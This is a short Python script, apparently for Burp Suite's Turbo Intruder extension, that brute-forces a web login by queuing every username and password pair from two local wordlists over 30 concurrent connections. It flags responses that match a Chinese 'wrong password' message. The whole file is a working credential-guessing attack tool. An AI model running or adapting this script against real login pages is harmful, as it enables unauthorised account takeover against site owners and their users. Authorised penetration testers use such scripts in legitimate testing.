#Author: unknow
from urllib import quote

def password_brute(target,engine):
    for word in open('mypass.txt'):
        engine.queue(target.req, quote(word.rstrip()))
        
def user_brute(target,engine):
    for word in open('myuser.txt'):
        engine.queue(target.req, quote(word.rstrip())) 

def user_password_brute(target, engine):
    for password in open('mypass.txt'):
        for user in open('myuser.txt'):
            engine.queue(target.req, [quote(user.rstrip()), quote(password.rstrip())])
            
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    #user_brute(target,engine)    
    #password_brute(target,engine)    
    user_password_brute(target,engine)
    
def handleResponse(req, interesting):
    #currently available attributes are req.status, req.wordcount, req.length and req.response    
    if req.response == '密码错误':
        table.add(req)